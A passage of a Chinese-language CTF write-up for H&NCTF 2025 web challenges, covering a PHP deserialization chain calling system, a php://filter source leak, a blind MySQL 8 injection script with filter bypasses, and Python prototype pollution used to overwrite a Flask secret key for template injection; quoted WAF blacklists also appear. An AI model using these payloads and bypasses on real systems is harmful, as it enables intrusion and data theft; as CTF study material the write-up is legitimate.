class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$ggg</span>,<span class="number">0</span>));</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:2:&quot;ls&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:0;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;i:1;i:0;&#125;</span></span><br><span class="line"><span class="comment">// i:1 改为 i:0 可以对比末尾</span></span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:2:&quot;ls&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:0;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;i:0;i:0;&#125;</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616091939331.png" class="" title="image-20250616091939331"><p>接着执行ls &#x2F;；直接拿flag即可。</p><img src="/CTFwp/H&NCTF-2025/image-20250616092035545.png" class="" title="image-20250616092035545"><img src="/CTFwp/H&NCTF-2025/image-20250616092144991.png" class="" title="image-20250616092144991"><h2 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h2><img src="/CTFwp/H&NCTF-2025/image-20250616094822161.png" class="" title="image-20250616094822161"><p>删除后，输入xiyangyang和huitailang。</p><img src="/CTFwp/H&NCTF-2025/image-20250616094943838.png" class="" title="image-20250616094943838"><p>有文件包含漏洞。</p><p>我们试着泄露一下源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.198:38693/tips.php?file=php://filter/convert.base64-encode/resource=tips.php</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616095245341.png" class="" title="image-20250616095245341"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 PHP 7 添加 str_starts_with 函数兼容支持</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;str_starts_with&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str_starts_with</span>(<span class="params"><span class="variable">$haystack</span>, <span class="variable">$needle</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$haystack</span>, <span class="variable">$needle</span>) === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;verified&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;verified&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: aicuo.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?file=flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); <span class="comment">// 去除首尾的空白字符</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$file</span>)) &#123;  <span class="comment">// \s 表示任意空白字符 不能包含空白字符</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to use space huh?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$file</span>)) &#123; <span class="comment">// 不能包含../</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to include files from parent directory huh?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\//&#x27;</span>, <span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$file</span>, <span class="string">&#x27;php://filter&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to include files from root directory huh?&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// 以/开头，不以php://filter开头，die</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$file</span>, <span class="string">&#x27;php://filter&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;无法读取文件&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 这就是为啥我们可以通过php://filter得到源码</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 当是我试php://filter，看到无法读取文件，以为被过滤了，后面就想如何绕过.php后缀了，反正没做出来。</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616100536193.png" class="" title="image-20250616100536193"><p>base64解码：<code>/var/flag/flag.txt</code></p><img src="/CTFwp/H&NCTF-2025/image-20250616100721908.png" class="" title="image-20250616100721908"><p>还有一种非预期的做法：</p><p>通过包含pearcmd进行getshell。</p><img src="/CTFwp/H&NCTF-2025/image-20250616191035585.png" class="" title="image-20250616191035585"><p>进行命令执行：</p><img src="/CTFwp/H&NCTF-2025/image-20250616191223647.png" class="" title="image-20250616191223647"><h2 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h2><p>弱口令密码爆破：admin123</p><img src="/CTFwp/H&NCTF-2025/image-20250616105636001.png" class="" title="image-20250616105636001"><p>告诉我们两点：flag放在<code>hacker*****</code>用户下。数据都是小写。</p><p>寻找注入点：</p><ol><li>username 这里无论怎么尝试，返回结果：用户名只能为字母或数字。</li><li>password <code>输入admin123&#39;，返回结果：密码包含非法字符，说明&#39;被过滤了；输入admin123%2527,返回结果：系统错误;出现报错，说明闭合方式就是&#39;。</code></li></ol><p>注入点在password。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin123%2527#</span><br><span class="line"><span class="comment"># 返回结果登录成功</span></span><br><span class="line">username=admin&amp;password=admin123%2527or#</span><br><span class="line"><span class="comment"># 包含非法字符</span></span><br><span class="line"><span class="comment"># or也被过滤了 通过逻辑运算符||替换</span></span><br><span class="line">username=admin&amp;password=admin123%2527||1#</span><br><span class="line"><span class="comment"># 登录成功</span></span><br><span class="line"><span class="comment"># 此题主要考察的是mysql8的新特性注入</span></span><br><span class="line">username=admin&amp;password=admin123%2527||@@version like %25278.%%2527#</span><br><span class="line"><span class="comment"># 返回结果 包含非法字符，最后经测试发现过滤了空格，/**/并没有过滤，通过/**/代替。</span></span><br><span class="line">username=admin&amp;password=admin123%2527||@@version/**/like/**/%25278.%%2527#</span><br><span class="line"><span class="comment"># 登录成功 ， 说明版本确实大于8。</span></span><br><span class="line">username=admin&amp;password=admin123%2527/**/order/**/by/**/4#</span><br><span class="line"><span class="comment"># 登录成功</span></span><br><span class="line">username=admin&amp;password=admin123%2527/**/order/**/by/**/5#</span><br><span class="line"><span class="comment"># 系统错误</span></span><br><span class="line"><span class="comment"># 说明只有4列</span></span><br></pre></td></tr></table></figure><p>由于select也被过滤了，所以我们可以利用mysql8新增加了一个特性，table和select的功能有些类似，由于我们不知道表名，可以通过mysql的sys.schema_tables_with_full_table_scans性能视图获得。</p><p>我是搬运工大王：搬运来的内容如下图</p><img src="/CTFwp/H&NCTF-2025/image-20250616113630027.png" class="" title="image-20250616113630027"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.digits + string.ascii_lowercase + <span class="string">&#x27;~&#x27;</span> <span class="comment"># 确保字符的ascii 从小到大</span></span><br><span class="line">result_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://27.25.151.198:40849/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(char)):</span><br><span class="line">        <span class="comment"># payload = &#x27;1%27||((%27hnctfweb%27,%27hnctfuser%27,%27%27,%27%27)&lt;=(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1))#&#x27;.format(result_data+char[i]) #table sys.schema_tables_with_full_table_scans 为 4 列</span></span><br><span class="line">        <span class="comment"># payload = &#x27;1%27||((%271%27,%27admin%27,%27admin123%27,%27%27)&lt;=(table/**/hnctfuser/**/limit/**/1))#&#x27;.format(result_data+char[i]) # order by 测试为4列</span></span><br><span class="line">        payload = <span class="string">&#x27;1%27||((%272%27,%27hacker3wkfv%27,%27&#123;&#125;%27,%27%27)&lt;=(table/**/hnctfuser/**/limit/**/1/**/offset/**/1))#&#x27;</span>.<span class="built_in">format</span>(result_data+char[i]) <span class="comment">#d8578edf845</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;登录成功&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;错误&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">if</span> char[i-<span class="number">1</span>] == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;~已结束~&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            result_data += char[i-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>+result_data)</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616172747533.png" class="" title="image-20250616172747533"><p>我们可以看到sys.schema_tables_with_full_table_scans为4列，用爆破出来的密码访问就可以。</p><img src="/CTFwp/H&NCTF-2025/image-20250616114531179.png" class="" title="image-20250616114531179"><h2 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h2><p>坑：抓本地包的时候，无法抓包，原因：</p><img src="/CTFwp/H&NCTF-2025/image-20250624165636989.png" class="" title="image-20250624165636989"><p>将忽略域名&#x2F;主机名设置为&lt;-loopback&gt;；强制让谷歌浏览器代理本地回环。</p><p>看题：</p><p>&#x2F;add路由</p><img src="/CTFwp/H&NCTF-2025/image-20250624170053040.png" class="" title="image-20250624170053040"><p>request.data主要接受的是json格式的数据，在发包的时候，修改发包方式为：Content-Type: application&#x2F;json。</p><p>存在merge合并函数，说明这里存在python的原型链污染；json_data是我们可控的；先通过原型链污染泄露源码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;_static_folder&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;./&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到在json.loads前，调用了一个check函数，经过测试发现过滤了，<code>globals、app、/</code>。</p><p>python的json模块根据json的规范设计，它会自动检测并解析Unicode转义序列(example:\uxxxx)，将其转换为相应的Unicode字符。</p><p>这里我们可以通过unicode编码，绕过检测：</p><img src="/CTFwp/H&NCTF-2025/image-20250624171310185.png" class="" title="image-20250624171310185"><img src="/CTFwp/H&NCTF-2025/image-20250624171339219.png" class="" title="image-20250624171339219"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">raw_data, forbidden_keywords=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    检查原始数据中是否包含禁止的关键词</span></span><br><span class="line"><span class="string">    如果包含禁止关键词返回 True，否则返回 False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 设置默认禁止关键词</span></span><br><span class="line">    <span class="keyword">if</span> forbidden_keywords <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        forbidden_keywords = [<span class="string">&quot;app&quot;</span>, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;SECRET&quot;</span>, <span class="string">&quot;pardir&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否包含任何禁止关键词</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> raw_data <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param_black_list = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;%1c&#x27;</span>, <span class="string">&#x27;%1d&#x27;</span>, <span class="string">&#x27;%1f&#x27;</span>, <span class="string">&#x27;%1e&#x27;</span>, <span class="string">&#x27;%20&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>, <span class="string">&#x27;%2c&#x27;</span>, <span class="string">&#x27;%3c&#x27;</span>, <span class="string">&#x27;%3e&#x27;</span>, <span class="string">&#x27;%c&#x27;</span>, <span class="string">&#x27;%2f&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;b64decode&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;encode&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>,  <span class="string">&#x27;flag&#x27;</span>,  <span class="string">&#x27;set&#x27;</span>,  <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;file&#x27;</span>,  <span class="string">&#x27;pop(&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;setdefault&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;endfor&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;=&#x27;</span> ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增强WAF防护</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_check</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="comment"># 检查是否有不合法的字符</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> param_black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> value:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否是自动化工具请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_automated_request</span>():</span><br><span class="line">    user_agent = request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    <span class="comment"># 如果是常见的自动化工具的 User-Agent，返回 True</span></span><br><span class="line">    automated_agents = [<span class="string">&#x27;fenjing&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;bot&#x27;</span>, <span class="string">&#x27;spider&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(agent <span class="keyword">in</span> user_agent <span class="keyword">for</span> agent <span class="keyword">in</span> automated_agents)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">value</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_automated_request():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Automated tool detected&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用WAF机制检查请求的合法性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> waf_check(value):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这些就是后面没有的代码。</p><img src="/CTFwp/H&NCTF-2025/image-20250624171552756.png" class="" title="image-20250624171552756"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">original_template = <span class="string">&#x27;Hello admin!!!Your permissions are&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(permission)</span><br></pre></td></tr></table></figure><p>这里存在模板注入漏洞；但是要求name必须为admin，且permission不能为0，所以我们还要污染密钥了。</p><img src="/CTFwp/H&NCTF-2025/image-20250624171953531.png" class="" title="image-20250624171953531"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// config app globals SECRET 都被过滤了 unicode编码</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250624172427557.png" class="" title="image-20250624172427557"><p>将密钥污染为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;1&quot; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;,&#x27;permission&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">array = <span class="string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class 